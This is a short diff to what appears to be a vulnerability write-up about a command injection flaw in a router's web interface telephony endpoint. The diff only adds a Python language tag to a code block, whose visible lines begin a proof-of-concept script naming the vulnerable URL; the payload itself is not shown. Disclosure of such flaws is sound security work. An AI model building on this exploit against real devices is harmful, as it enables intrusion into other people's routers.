@@ -10,7 +10,7 @@ which leads to a command injection vulnerability.
 ![image](../image/action_set_rat_mode-2.png)
 
 The potentially attacking vector is as follows:  
-```
+```py
 import requests
 
 TARGET_URL = "http://192.168.1.1/cgi-bin/luci/admin/telephony/trigger_set_nw_rat"
